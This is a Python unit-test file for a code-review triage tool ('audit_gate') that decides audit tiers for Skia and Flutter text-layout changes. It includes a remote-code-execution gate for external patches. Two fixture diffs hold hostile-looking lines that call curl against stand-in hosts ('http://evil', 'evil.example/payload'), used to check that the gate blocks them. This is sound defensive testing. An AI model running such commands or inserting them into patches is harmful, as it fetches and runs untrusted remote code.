#!/usr/bin/env python3
import base64
import pathlib
import sys
from unittest import mock
import unittest

SCRIPTS_DIR = pathlib.Path(__file__).resolve().parents[1] / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import audit_gate


RANGE_DIFF_1409697_REBASE_ONLY = """\
1:  11d7fba59d ! 1:  6e8dd008c2 [skparagraph] Add first-line indentation to Paragraph::layout
    @@ modules/skparagraph/src/TextWrapper.cpp: void TextWrapper::breakTextIntoLines(Pa
                  }
     
      ## modules/skparagraph/tests/SkParagraphTest.cpp ##
    -@@ modules/skparagraph/tests/SkParagraphTest.cpp: DEF_TEST(SkParagraph_ManyStyleBlocks, r) {
    -         }
    -     }
    +@@ modules/skparagraph/tests/SkParagraphTest.cpp: DEF_TEST(SkParagraph_GlyphOffsets, r) {
    +     });
    +     REPORTER_ASSERT(reporter, movedUpOrDown);
      }
     +
     +// First-line indentation belongs to line breaking/formatting, not to the text
"""

RANGE_DIFF_1409658_CODE_CHANGE = """\
1:  4b5f81e8c2 ! 1:  837e931c83 [skparagraph] Fix utf8Starts in extendedVisit for slices
    @@ modules/skparagraph/src/ParagraphImpl.cpp: void ParagraphImpl::extendedVisit(con
                          if (run->fClusterStart > 0) {
     -                        clusterStorage.reset(context.size);
    --                          clusterStorage[i] = run->fClusterStart + run->fClusterIndexes[i];
    +-                            clusterStorage[i] = run->globalClusterIndex(i);
     +                        clusterStorage.reset(context.size + 1);
    -+                            clusterStorage[i] = run->fClusterIndexes[context.pos + i];
    ++                            clusterStorage[i] = run->globalClusterIndex(context.pos + i);
                          }
"""

RANGE_DIFF_COMMIT_MSG_ONLY = """\
1:  837e931c83 ! 1:  598b140257 [skparagraph] Fix utf8Starts in extendedVisit for slices
    @@ Metadata
      ## Commit message ##
    -    Fix utf8Starts in extendedVisit.
    +    Fix utf8Starts in extendedVisit, for example a wrapped line that continues a run.
     
         Change-Id: I1234567890abcdef1234567890abcdef12345678
"""

GITHUB_PATCH_OLD = """\
From 88b5e70c41000000000000000000000000000000 Mon Sep 17 00:00:00 2001
Date: Wed, 28 Oct 2026 10:00:00 -0400
Subject: [PATCH] [web_paragraph] Render soft hyphens

---
 engine/src/flutter/lib/web_ui/lib/src/engine/text/layout.dart | 4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)

diff --git a/lib/web_ui/lib/src/engine/text/layout.dart b/lib/web_ui/lib/src/engine/text/layout.dart
index 1111111..2222222 100644
--- a/lib/web_ui/lib/src/engine/text/layout.dart
+++ b/lib/web_ui/lib/src/engine/text/layout.dart
@@ -170,4 +170,6 @@ class TextLayout {
   int? softHyphenBefore(int clusterIndex) {
-    return null;
+    if (clusterIndex <= 0) return null;
+    return clusters[clusterIndex].start - 1;
+  }
"""

GITHUB_PATCH_REBASED = """\
From 11db23963ceac1e412b732b3121f007ff76920ea Mon Sep 17 00:00:00 2001
Date: Mon, 02 Nov 2026 14:00:00 -0500
Subject: [PATCH] [web_paragraph] Render soft hyphens

---
 engine/src/flutter/lib/web_ui/lib/src/engine/text/layout.dart | 4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)

diff --git a/lib/web_ui/lib/src/engine/text/layout.dart b/lib/web_ui/lib/src/engine/text/layout.dart
index 9999999..aaaaaaa 100644
--- a/lib/web_ui/lib/src/engine/text/layout.dart
+++ b/lib/web_ui/lib/src/engine/text/layout.dart
@@ -214,4 +214,6 @@ class TextLayout {
   differentSurroundingContextAfterRebase();
-    return null;
+    if (clusterIndex <= 0) return null;
+    return clusters[clusterIndex].start - 1;
+  }
"""

GITHUB_PATCH_MODIFIED = GITHUB_PATCH_REBASED.replace(
    "clusters[clusterIndex].start - 1",
    "clusters[clusterIndex].start - 2",
)


class AuditGateTests(unittest.TestCase):
    def test_range_diff_parser_distinguishes_conflict_rebase_from_code_change(self):
        self.assertEqual(
            audit_gate.parse_range_diff_delta(RANGE_DIFF_1409697_REBASE_ONLY),
            "rebase_only",
        )
        self.assertEqual(
            audit_gate.parse_range_diff_delta(RANGE_DIFF_1409658_CODE_CHANGE),
            "code_change",
        )
        self.assertEqual(
            audit_gate.parse_range_diff_delta(RANGE_DIFF_COMMIT_MSG_ONLY),
            "commit_msg_only",
        )
        self.assertEqual(
            audit_gate.parse_range_diff_delta("1: 268361ea75 = 1: dced28a241 Subject\n"),
            "rebase_only",
        )
        self.assertEqual(
            audit_gate.parse_range_diff_delta("-:  ------- > 1:  abcdef1234 Added commit\n"),
            "code_change",
        )
        self.assertEqual(
            audit_gate.parse_range_diff_delta("1:  1234567890 < -:  ------- Dropped commit\n"),
            "code_change",
        )

    def test_gerrit_changekind_fast_path_skips_git_subprocess(self):
        revs = {
            2: {"sha": "268361ea75", "kind": "NO_CODE_CHANGE", "parent": "aaa1111"},
            3: {"sha": "e1e2fa72aa", "kind": "TRIVIAL_REBASE", "parent": "bbb2222"},
            4: {"sha": "dced28a241", "kind": "TRIVIAL_REBASE", "parent": "ccc3333"},
        }
        with mock.patch("subprocess.run") as mock_run:
            delta = audit_gate.classify_patchset_delta(
                kind="gerrit",
                host="skia-review.googlesource.com",
                repo_slug="skia",
                target_id="1412383",
                prev_ps=2,
                cur_ps=4,
                prev_rev="268361ea75",
                cur_rev="dced28a241",
                revisions_by_ps=revs,
                changed_files=["modules/skparagraph/src/Run.cpp"],
                skia_git_dir="",
            )
            mock_run.assert_not_called()
        self.assertEqual(delta["delta_kind"], "rebase_only")
        self.assertFalse(delta["is_code_change"])

    def test_github_patch_normalizer_detects_force_push_rebase_vs_real_edit(self):
        self.assertEqual(
            audit_gate.compare_github_patches(GITHUB_PATCH_OLD, GITHUB_PATCH_REBASED),
            "rebase_only",
        )
        self.assertEqual(
            audit_gate.compare_github_patches(GITHUB_PATCH_OLD, GITHUB_PATCH_MODIFIED),
            "code_change",
        )

    def test_non_audit_ping_message_filter(self):
        self.assertTrue(
            audit_gate.is_non_audit_ping_message(
                "Patch Set 1: Code-Review+1 Commit-Queue+2"
            )
        )
        self.assertTrue(
            audit_gate.is_non_audit_ping_message(
                "Hi reviewers, could you please land this CL if there are no concerns?"
            )
        )
        self.assertTrue(audit_gate.is_non_audit_ping_message("PTAL, thanks!"))
        self.assertFalse(
            audit_gate.is_non_audit_ping_message(
                "softHyphenOffset can be negative at layout.dart:180 when clusterIndex is 0"
            )
        )

    def test_decide_audit_action_tiers_and_preflight_guard(self):
        base_item = {
            "item_key": "gerrit:1412383",
            "kind": "gerrit",
            "target_id": "1412383",
            "url": "https://skia-review.googlesource.com/c/skia/+/1412383",
            "subject": "[skparagraph] Do not keep the paragraph in each Cluster",
            "patchset": 4,
            "revision": "dced28a241",
            "self_cr_vote": 1,
            "attention_reason": "",
            "files": ["modules/skparagraph/src/Run.cpp"],
        }
        prev_tr = {
            "triaged_patchset": 2,
            "triaged_revision": "268361ea75",
            "review_outcome": "CLEAN",
            "verdict": "CLEAN",
            "summary": "All cluster owner invariants verified",
        }
        # Tier 0: pure rebase without upstream module overlap -> 0 LLM tokens
        dec_t0 = audit_gate.decide_audit_action(
            item=base_item,
            prev_triage=prev_tr,
            delta_info={
                "delta_kind": "rebase_only",
                "is_code_change": False,
                "upstream_module_overlap": False,
                "upstream_commits": [],
            },
            has_new_external_msg=False,
            msg_snippet="",
            open_external_threads=0,
            preflight={"ok": True, "reason": ""},
        )
        self.assertEqual(dec_t0["tier"], 0)
        self.assertEqual(dec_t0["audit_state"], "done")

        # Tier 1: rebase_only WITH upstream commits in the same module (like 1409697 PS6)
        dec_t1_overlap = audit_gate.decide_audit_action(
            item={
                **base_item,
                "item_key": "gerrit:1409697",
                "target_id": "1409697",
                "patchset": 6,
                "self_cr_vote": 0,
                "attention_reason": "Vote got outdated and was removed: Code-Review+1",
            },
            prev_triage=prev_tr,
            delta_info={
                "delta_kind": "rebase_only",
                "is_code_change": False,
                "upstream_module_overlap": True,
                "upstream_commits": ["ce0b85b46d Soft hyphen in justify"],
            },
            has_new_external_msg=False,
            msg_snippet="",
            open_external_threads=0,
            preflight={"ok": True, "reason": ""},
        )
        self.assertEqual(dec_t1_overlap["tier"], 1)
        self.assertIn("ce0b85b46d", dec_t1_overlap["prompt"])

        # Skip: polite ping on unchanged code with 0 unresolved external threads (1409637 PS1)
        dec_skip = audit_gate.decide_audit_action(
            item={**base_item, "patchset": 2, "revision": "268361ea75"},
            prev_triage=prev_tr,
            delta_info={
                "delta_kind": "unchanged",
                "is_code_change": False,
                "upstream_module_overlap": False,
                "upstream_commits": [],
            },
            has_new_external_msg=True,
            msg_snippet="Hi reviewers, could you please land this CL if there are no concerns?",
            open_external_threads=0,
            preflight={"ok": True, "reason": ""},
        )
        self.assertEqual(dec_skip["tier"], -1)

        # Blocked auth: expired gcert pauses Tier 2 audit without consuming claim
        dec_auth = audit_gate.decide_audit_action(
            item={**base_item, "patchset": 5, "revision": "837e931c83"},
            prev_triage=prev_tr,
            delta_info={
                "delta_kind": "code_change",
                "is_code_change": True,
                "upstream_module_overlap": False,
                "upstream_commits": [],
            },
            has_new_external_msg=False,
            msg_snippet="",
            open_external_threads=0,
            preflight={"ok": False, "reason": "LOAS expired (run gcert)"},
        )
        self.assertEqual(dec_auth["tier"], -1)
        self.assertEqual(dec_auth["audit_state"], "blocked_auth")

        # Tier 2: real code change -> deep audit on tier="pro" with auto-corpus after CLEAN/NITS
        dec_t2 = audit_gate.decide_audit_action(
            item={
                **base_item,
                "patchset": 5,
                "revision": "837e931c83",
                "files": [
                    "modules/skparagraph/include/Paragraph.h",
                    "modules/skparagraph/src/ParagraphImpl.cpp",
                ],
            },
            prev_triage=prev_tr,
            delta_info={
                "delta_kind": "code_change",
                "is_code_change": True,
                "upstream_module_overlap": False,
                "upstream_commits": [],
            },
            has_new_external_msg=False,
            msg_snippet="",
            open_external_threads=1,
            preflight={"ok": True, "reason": ""},
        )
        self.assertEqual(dec_t2["tier"], 2)
        self.assertEqual(dec_t2["model_tier"], "pro")
        self.assertIn("save-review", dec_t2["prompt"])
        self.assertIn("-Wshorten-64-to-32", dec_t2["prompt"])
        self.assertIn("run_flutter_paragraph_tests.py", dec_t2["prompt"])
        self.assertNotIn("НЕ запускай автоматическую сборку", dec_t2["prompt"])
        self.assertIn("НЕ заливай companion %wip CL", dec_t2["prompt"])
        self.assertIn("gerrit_draft.py save", dec_t2["prompt"])
        self.assertIn("НИКОГДА не публикуй `/review`", dec_t2["prompt"])

        # Unaudited CL (prev_triage is None) with rebase_only/commit_msg_only must run Tier 2
        dec_unaudited_rebase = audit_gate.decide_audit_action(
            item=base_item,
            prev_triage=None,
            delta_info={
                "delta_kind": "rebase_only",
                "is_code_change": False,
                "upstream_module_overlap": False,
                "upstream_commits": [],
            },
            has_new_external_msg=False,
            msg_snippet="",
            open_external_threads=0,
            preflight={"ok": True, "reason": ""},
        )
        self.assertEqual(dec_unaudited_rebase["tier"], 2)
        self.assertEqual(dec_unaudited_rebase["delta_kind"], "initial")

    def test_auto_corpus_and_external_rce_gate_in_build_audit_prompt(self):
        # Internal Googler SkParagraph CL on Cloudtop runs both Flutter corpus and google3 A/B
        goog_prompt = audit_gate.build_audit_prompt(
            tier=2,
            item={
                "item_key": "gerrit:1400176",
                "kind": "gerrit",
                "target_id": "1400176",
                "url": "https://skia-review.googlesource.com/c/skia/+/1400176",
                "subject": "[skparagraph] Fix line metrics",
                "patchset": 3,
                "revision": "abcdef123456",
                "is_external": False,
                "role": "reviewer (goog)",
                "files": [
                    "modules/skparagraph/src/ParagraphImpl.cpp",
                    "modules/skparagraph/BUILD.bazel",
                ],
            },
            prev_triage=None,
            delta_info={"delta_kind": "initial"},
            has_citc=True,
        )
        self.assertIn("run_flutter_paragraph_tests.py", goog_prompt)
        self.assertIn("run_g3_paragraph_tests.py", goog_prompt)
        self.assertIn("cand=cl:1400176/3", goog_prompt)
        self.assertIn("--g3-compare-md", goog_prompt)
        self.assertNotIn("RCE-гейт заблокировал", goog_prompt)

        # External WebParagraph PR with pure .dart source files passes path check and checks diff
        ext_safe = audit_gate.check_external_corpus_safety(
            ["engine/src/flutter/lib/web_ui/lib/src/engine/text_fragmenter.dart"],
            is_external=True,
        )
        self.assertTrue(ext_safe["safe"])
        ext_wp_prompt = audit_gate.build_audit_prompt(
            tier=2,
            item={
                "item_key": "github:195366",
                "kind": "github",
                "target_id": "195366",
                "url": "https://github.com/flutter/flutter/pull/195366",
                "subject": "[web_paragraph] Render soft hyphens",
                "patchset": 1,
                "head_sha": "c3d96d675db3",
                "is_external": True,
                "files": ["engine/src/flutter/lib/web_ui/lib/src/engine/text_fragmenter.dart"],
            },
            prev_triage=None,
            delta_info={"delta_kind": "initial"},
            has_citc=True,
        )
        self.assertIn("run_webparagraph_corpus.py", ext_wp_prompt)
        self.assertIn("Process.run", ext_wp_prompt)

        # External PR touching build/script files or adding exec primitives is blocked by RCE gate
        bad_path = audit_gate.check_external_corpus_safety(
            ["modules/skparagraph/src/ParagraphImpl.cpp", "BUILD.gn"],
            is_external=True,
        )
        self.assertFalse(bad_path["safe"])
        self.assertIn("BUILD.gn", bad_path["reason"])

        bad_diff = audit_gate.check_external_corpus_safety(
            ["engine/src/flutter/lib/web_ui/lib/src/engine/layout.dart"],
            is_external=True,
            patch_text="+++ b/layout.dart\n+  await Process.run('curl', ['http://evil']);\n",
        )
        self.assertFalse(bad_diff["safe"])

        blocked_prompt = audit_gate.build_audit_prompt(
            tier=2,
            item={
                "item_key": "gerrit:1499999",
                "kind": "gerrit",
                "target_id": "1499999",
                "url": "https://skia-review.googlesource.com/c/skia/+/1499999",
                "subject": "External build tweak",
                "patchset": 1,
                "revision": "deadbeef1234",
                "is_external": True,
                "role": "reviewer (ext)",
                "files": ["modules/skparagraph/src/ParagraphImpl.cpp", "DEPS"],
            },
            prev_triage=None,
            delta_info={"delta_kind": "initial"},
            has_citc=True,
        )
        self.assertIn("RCE-гейт заблокировал", blocked_prompt)
        self.assertIn("--corpus pending", blocked_prompt)

        # Dual-corpus files keep both runners in gate_cmds without duplicate --compare-md flags
        dual_prompt = audit_gate.build_audit_prompt(
            tier=2,
            item={
                "item_key": "gerrit:1400555",
                "kind": "gerrit",
                "target_id": "1400555",
                "url": "https://skia-review.googlesource.com/c/skia/+/1400555",
                "subject": "Sync paragraph changes",
                "patchset": 2,
                "revision": "123456abcdef",
                "is_external": False,
                "files": [
                    "modules/skparagraph/src/ParagraphImpl.cpp",
                    "engine/src/flutter/lib/web_ui/lib/src/engine/text_fragmenter.dart",
                ],
            },
            prev_triage=None,
            delta_info={"delta_kind": "initial"},
            has_citc=False,
        )
        self.assertIn("run_flutter_paragraph_tests.py", dual_prompt)
        self.assertIn("run_webparagraph_corpus.py", dual_prompt)
        self.assertIn("--compare-md /tmp/flutter_cl_1400555_ps2/compare.md", dual_prompt)
        self.assertNotIn("--compare-md /tmp/wp_pr_1400555_ps2/compare.md", dual_prompt)

    def test_decide_audit_action_fetches_external_patch_for_rce_gate(self):
        # decide_audit_action fetches external patch text so diff-level RCE blocks unsafe calls
        b64_evil_patch = base64.b64encode(
            b"--- a/modules/skparagraph/src/ParagraphImpl.cpp\n"
            b"+++ b/modules/skparagraph/src/ParagraphImpl.cpp\n"
            b"+  system(\"curl https://evil.example/payload\");\n"
        )
        fake_resp = mock.MagicMock()
        fake_resp.read.return_value = b64_evil_patch
        fake_resp.__enter__.return_value = fake_resp
        with mock.patch("urllib.request.urlopen", return_value=fake_resp):
            dec_ext_rce = audit_gate.decide_audit_action(
                item={
                    "item_key": "gerrit:1499998",
                    "kind": "gerrit",
                    "host": "skia-review.googlesource.com",
                    "target_id": "1499998",
                    "url": "https://skia-review.googlesource.com/c/skia/+/1499998",
                    "subject": "[skparagraph] Innocuous looking title",
                    "patchset": 1,
                    "revision": "feedface1234",
                    "is_external": True,
                    "role": "reviewer (ext)",
                    "files": ["modules/skparagraph/src/ParagraphImpl.cpp"],
                },
                prev_triage=None,
                delta_info={
                    "delta_kind": "initial",
                    "is_code_change": True,
                    "upstream_module_overlap": False,
                    "upstream_commits": [],
                },
                has_new_external_msg=False,
                msg_snippet="",
                open_external_threads=0,
                preflight={"ok": True, "reason": ""},
            )
        self.assertEqual(dec_ext_rce["tier"], 2)
        self.assertIn("RCE-гейт заблокировал", dec_ext_rce["prompt"])
        self.assertIn("--corpus pending", dec_ext_rce["prompt"])

    def test_check_audit_preflight_passes_check_ssh_false(self):
        ok_proc = mock.Mock(returncode=0)
        with (
            mock.patch.object(audit_gate.shutil, "which", return_value="/usr/bin/gcertstatus"),
            mock.patch.object(audit_gate.subprocess, "run", return_value=ok_proc) as mock_run,
        ):
            res = audit_gate.check_audit_preflight("15m")
        self.assertEqual(res, {"ok": True, "reason": ""})
        argv = mock_run.call_args[0][0]
        self.assertIn("-check_ssh=false", argv)
        self.assertIn("-check_remaining=15m", argv)

        fail_proc = mock.Mock(returncode=1)
        with (
            mock.patch.object(audit_gate.shutil, "which", return_value="/usr/bin/gcertstatus"),
            mock.patch.object(audit_gate.subprocess, "run", return_value=fail_proc),
        ):
            res_exp = audit_gate.check_audit_preflight("15m")
        self.assertFalse(res_exp["ok"])

    def test_github_coreviewer_review_bump_with_same_head_sha_is_unchanged(self):
        with mock.patch("subprocess.check_output") as mock_gh:
            delta = audit_gate.classify_patchset_delta(
                kind="github",
                host="github.com/flutter/flutter",
                repo_slug="flutter/flutter",
                target_id="188906",
                prev_ps=3,
                cur_ps=4,
                prev_rev="e5f898612a",
                cur_rev="e5f898612a11984e30fc7611e42eb807fbb6f2b4",
            )
            mock_gh.assert_not_called()
        self.assertEqual(delta["delta_kind"], "unchanged")
        self.assertFalse(delta["is_code_change"])

    # Verify Tier 1 and Tier 2 SkParagraph audit prompts invoke run_flutter_paragraph_tests.py
    # with --full so broken Canary-Flutter rolls cannot leave non-targeted Flutter suites uncovered
    def test_flutter_corpus_gate_passes_full_flag_across_tiers(self):
        item = {
            "item_key": "gerrit:1427776",
            "kind": "gerrit",
            "target_id": "1427776",
            "url": "https://skia-review.googlesource.com/c/skia/+/1427776",
            "subject": "[skparagraph] Compare edging, subpixel and hinting in TextStyle::equals",
            "patchset": 1,
            "revision": "6d20ea001319",
            "is_external": True,
            "role": "reviewer (ext)",
            "files": ["modules/skparagraph/src/TextStyle.cpp"],
        }
        t2_prompt = audit_gate.build_audit_prompt(
            tier=2,
            item=item,
            prev_triage=None,
            delta_info={"delta_kind": "initial"},
            has_citc=True,
        )
        self.assertIn(
            "run_flutter_paragraph_tests.py --full --out /tmp/flutter_cl_1427776_ps1",
            t2_prompt,
        )
        t1_prompt = audit_gate.build_audit_prompt(
            tier=1,
            item={**item, "patchset": 2},
            prev_triage={"triaged_patchset": 1, "triaged_revision": "6d20ea001319"},
            delta_info={
                "delta_kind": "rebase_only",
                "upstream_commits": ["ce0b85b46d Soft hyphen in justify"],
            },
            has_citc=False,
        )
        self.assertIn(
            "run_flutter_paragraph_tests.py --full --out /tmp/flutter_cl_1427776_ps2",
            t1_prompt,
        )


if __name__ == "__main__":
    unittest.main()
